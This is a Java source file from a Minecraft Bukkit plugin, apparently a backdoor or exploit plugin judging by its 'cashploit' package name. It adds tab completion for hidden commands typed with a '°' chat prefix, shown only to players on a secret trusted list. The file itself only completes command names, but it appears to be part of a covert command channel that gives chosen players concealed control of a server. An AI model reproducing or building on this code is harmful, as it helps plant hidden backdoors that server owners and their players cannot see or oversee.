package de.cashploit5.events.tab;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatTabCompleteEvent;

import de.cashploit5.Main;
import de.cashploit5.command.Command;
import de.cashploit5.command.TrustCommand;

public class TabListener implements Listener {

	private Main main;

	public TabListener(Main main) {
		main.getServer().getPluginManager().registerEvents(this, main);
		this.main = main;
	}

	@EventHandler
	public void onTab(PlayerChatTabCompleteEvent e) {
		String[] args = e.getChatMessage().split(" ");
		List<String> completions = new ArrayList<>();
		if (args.length == 1) {
			if (args[0].startsWith("°")
					&& TrustCommand.getTrustedPlayers().contains(e.getPlayer().getUniqueId().toString())) {
				args[0] = args[0].substring(1);
				List<Command> commands = main.getCommandManager().getCommands();

				for (Command command : commands) {
					if (command.getName().equalsIgnoreCase(args[0])) {
						args = new String[] { ("°" + command.getName()), "" };
					} else {
						if (command.getName().startsWith(args[0])) {
							completions.add("°" + command.getName());
						}
					}
				}
				e.getTabCompletions().clear();
				for (String completion : completions) {
					e.getTabCompletions().add(completion);
				}
			}
		}
		if (args.length >= 2) {
			if (TrustCommand.getTrustedPlayers().contains(e.getPlayer().getUniqueId().toString())) {
				for (Command command : main.getCommandManager().getCommands()) {
					if (args[0].equalsIgnoreCase("°" + command.getName())) {
						String[] arguments = new String[] {};

						arguments = e.getChatMessage().toLowerCase().replaceAll("°" + command.getName() + " ", "")
								.split(" ");

						String[] argz = arguments;
						if (argz.length >= 1)
							if (e.getChatMessage().endsWith(" ")) {
								if (!argz[0].equalsIgnoreCase("")) {
									argz = new String[arguments.length + 1];
									for (int i = 0; i < arguments.length; i++) {
										argz[i] = arguments[i];
									}
									argz[arguments.length] = "";
								}
							}

						if (TabManager.getTabCompleters().get(command) != null) {
							completions = TabManager.getTabCompleters().get(command).onTab(e.getPlayer(), argz);
							e.getTabCompletions().clear();
							for (String completion : completions) {
								e.getTabCompletions().add(completion);
							}
						}
					}
				}
			}
		}
	}
}
